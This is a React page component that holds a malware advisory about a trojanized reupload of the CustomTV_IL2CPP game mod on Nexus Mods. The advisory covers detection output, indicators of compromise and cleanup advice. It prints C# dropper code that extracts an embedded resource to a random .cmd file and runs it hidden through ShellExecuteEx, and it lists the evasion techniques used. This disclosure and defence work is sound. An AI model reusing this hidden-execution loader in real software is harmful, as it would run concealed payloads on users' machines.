export default function CustomTVIL2CPPMalwareAnalysisContent() {
  return (
    <>
      <div className="bg-red-500/10 border-2 border-red-500/50 rounded-lg p-6 mb-6">
        <p className="text-xl font-bold text-red-200 mb-3">⚠️ IMPORTANT DISCLAIMER</p>
        <p className="text-gray-200 mb-4">
          This advisory analyzes a malicious <strong>reupload</strong> of a legitimate mod. The original <strong>CustomTV_IL2CPP</strong> mod and its author are legitimate and safe.
        </p>
        <p className="text-gray-200">
          A malicious actor downloaded/stole the original mod, injected malware into it, and reuploaded it to Nexus Mods under the same or similar name. If you are using the authentic original version from the legitimate author, you are safe. <strong>Only this specific malicious reupload is dangerous.</strong>
        </p>
      </div>

      <p className="text-lg text-gray-300 mb-6">
        The mod uses a sophisticated technique involving embedded resources and Windows API calls to execute malicious payloads. This represents a more advanced threat that embeds the payload directly within the mod file rather than downloading it from an external server.
      </p>

      <hr className="border-gray-800 my-8" />

      <h2 id="malicious-behavior" className="text-2xl font-bold text-white mb-4">Malicious Behavior</h2>
      
      <p className="text-gray-300 mb-4">
        Upon initialization, the mod extracts an embedded resource and executes it using the Windows ShellExecuteEx API:
      </p>

      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
        <code className="text-sm text-gray-300">
{`// OnInitializeMelon() - Extracts and executes embedded payload
// Step 1: Get embedded resource from assembly
Stream resource = Assembly.GetExecutingAssembly()
    .GetManifestResourceStream("MelonBase");

// Step 2: Create random temp file with .cmd extension  
string tempPath = Path.Combine(
    Path.GetTempPath(),
    string.Format("{0}.cmd", Guid.NewGuid())
);

// Step 3: Write resource to temp file
using (FileStream fs = new FileStream(tempPath, FileMode.Create))
{
    resource.CopyTo(fs);
}

// Step 4: Execute via ShellExecuteEx (hidden)
SHELLEXECUTEINFO info = new SHELLEXECUTEINFO();
info.cbSize = Marshal.SizeOf(info);
info.fMask = 64;
info.lpVerb = "open";
info.lpFile = tempPath;
info.nShow = 0; // Hidden
ShellExecuteEx(ref info); // Execute payload`}
        </code>
      </pre>

      <h3 className="text-lg font-semibold text-white mb-3">Attack Method</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Embedded Payload:</strong> Malicious code stored as "MelonBase" resource inside the DLL</li>
        <li><strong>Random Filename:</strong> Uses Guid.NewGuid() to create unpredictable temp file names</li>
        <li><strong>Windows API Abuse:</strong> Uses shell32.dll ShellExecuteEx via P/Invoke</li>
        <li><strong>Hidden Execution:</strong> nShow = 0 prevents window from appearing</li>
        <li><strong>Cleanup:</strong> Proper disposal pattern to avoid detection</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="detection" className="text-2xl font-bold text-white mb-4">MLVScan Detection</h2>
      
      <p className="text-gray-300 mb-4">
        MLVScan detected this threat through multiple detection vectors:
      </p>

      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
        <code className="text-sm text-gray-300">
{`[Critical] Detected high-risk DllImport of shell32.dll with 
       suspicious function ShellExecuteEx
  Rule: DllImportRule
  Location: Northwards.ShellExecuteEx
  
[High] Detected embedded resource extraction (GetManifestResourceStream)
  Rule: ResourceExtractionRule
  
[High] Suspicious use of Path.GetTempPath with file execution
  Rule: SuspiciousPathRule`}
        </code>
      </pre>

      <h3 className="text-lg font-semibold text-white mb-3">Whitelist Transition</h3>
      <p className="text-gray-300 mb-4">
        Prior to MLVScan 1.6.0 (released November 25, 2025), MLVScan used a filename-based whitelist that could potentially allow malware using random GUID filenames to bypass detection. This was transitioned to a SHA256 hash-based whitelist in MLVScan 1.6.0. What this means:
      </p>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Cryptographic Verification:</strong> Each file is identified by its unique SHA256 hash, not just its name</li>
        <li><strong>Tamper Detection:</strong> Any modification to a file changes its hash, immediately flagging it for re-analysis</li>
        <li><strong>No Filename Gaming:</strong> Malware cannot evade detection by simply using random or deceptive filenames</li>
        <li><strong>Immutable Trust:</strong> Once a file is verified and whitelisted, its hash is permanently associated with that clean state</li>
      </ul>

      <h3 className="text-lg font-semibold text-white mb-3">Detection Challenges</h3>
      <p className="text-gray-300 mb-4">
        This malware is more sophisticated than downloaders because:
      </p>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>No Network Traffic:</strong> Payload is embedded - no external download needed</li>
        <li><strong>Random Filenames:</strong> Each execution creates a different filename</li>
        <li><strong>Native API:</strong> Uses low-level Windows API instead of managed Process.Start</li>
        <li><strong>Legitimate Appearance:</strong> Includes actual TV functionality to appear legitimate</li>
      </ul>

      <h3 className="text-lg font-semibold text-white mb-3">Community Response</h3>
      <p className="text-gray-300 mb-4">
        The Schedule 1 modding Discord community actively monitors the Schedule 1 category on Nexus Mods. When malware is detected, community members immediately analyze and report it, leading to swift removal. Beyond reporting to Nexus Mods, the community also reports malicious infrastructure to registrars and hosting providers to further deter attackers.
      </p>

      <hr className="border-gray-800 my-8" />

      <h2 id="recommendations" className="text-2xl font-bold text-white mb-4">Recommendations</h2>
      
      <h3 className="text-xl font-semibold text-white mb-2">For Users Who Downloaded This Mod</h3>
      <div className="bg-orange-500/10 border border-orange-500/30 rounded-lg p-4 mb-6">
        <p className="text-orange-200 font-medium mb-2">⚠️ If you installed this mod:</p>
        <ul className="list-disc pl-6 space-y-1 text-gray-300">
          <li><strong>Immediately uninstall</strong> and delete all mod files</li>
          <li><strong>Check %TEMP% directory</strong> for .cmd files with GUID names (e.g., "a1b2c3d4.cmd")</li>
          <li><strong>Run a full antivirus scan</strong> - the payload may still be active</li>
          <li><strong>Check startup entries</strong> in Task Manager and registry</li>
          <li><strong>Change all passwords</strong> (Steam, banking, email)</li>
          <li><strong>Consider wiping and reinstalling Windows</strong></li>
        </ul>
      </div>

      <h3 className="text-xl font-semibold text-white mb-2">For All Users</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Always scan mods</strong> with MLVScan before installation</li>
        <li><strong>Watch for DllImport</strong> - legitimate mods rarely need shell32.dll</li>
        <li><strong>Check resource names</strong> - suspicious resources like "MelonBase" are red flags</li>
        <li><strong>Monitor temp folder</strong> for unexpected .cmd or .bat files</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="technical-analysis" className="text-2xl font-bold text-white mb-4">Technical Analysis</h2>
      
      <h3 className="text-lg font-semibold text-white mb-3">Indicators of Compromise (IOCs)</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Mod Name:</strong> CustomTV_IL2CPP</li>
        <li><strong>File Name:</strong> CustomTV_IL2CPP.dll</li>
        <li><strong>Embedded Resource:</strong> "MelonBase"</li>
        <li><strong>Temp Pattern:</strong> %TEMP%\{'{GUID}'}.cmd (e.g., a1b2c3d4-e5f6-...cmd)</li>
        <li><strong>API Import:</strong> shell32.dll!ShellExecuteEx</li>
        <li><strong>Assembly Name:</strong> CustomTV_IL2CPP, Version=1.0.0.0</li>
      </ul>

      <h3 className="text-lg font-semibold text-white mb-3">Evasion Techniques</h3>
      <ul className="list-disc pl-6 space-y-2 text-gray-300 mb-6">
        <li><strong>Embedded Payload:</strong> No network connection required</li>
        <li><strong>Randomized Filenames:</strong> GUID-based temp file names</li>
        <li><strong>Native API:</strong> Uses DllImport to bypass managed detection</li>
        <li><strong>Hidden Window:</strong> SW_HIDE (nShow = 0) prevents visibility</li>
        <li><strong>Legitimate Camouflage:</strong> Actual TV functionality masks malicious behavior</li>
      </ul>

      <hr className="border-gray-800 my-8" />

      <h2 id="references" className="text-2xl font-bold text-white mb-4">References</h2>
      <ul className="list-disc pl-6 space-y-2 text-gray-300">
        <li>Nexus Mods Report: Mod removed, user banned</li>
        <li>Analysis Tool: MLVScan with DllImport detection</li>
        <li>Detection Rules: DllImportRule, ResourceExtractionRule</li>
        <li>Sample Hash: [Available upon request to security researchers]</li>
      </ul>
    </>
  )
}
